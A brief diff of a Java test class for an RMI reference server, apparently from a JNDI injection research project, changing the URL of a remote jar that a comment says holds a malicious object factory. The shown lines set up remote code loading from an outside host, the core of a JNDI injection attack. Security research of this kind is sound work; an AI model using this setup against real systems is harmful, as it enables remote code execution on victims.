@@ -18,7 +18,7 @@ public class RMIReferenceServerTest {
 	public static void main(String[] args) {
 		try {
 			// 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
-			String url = "http://p2j.cn/tools/jndi-test.jar";
+			String url = "https://anbai.io/tools/jndi-test.jar";
 
 			// 对象的工厂类名
 			String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";
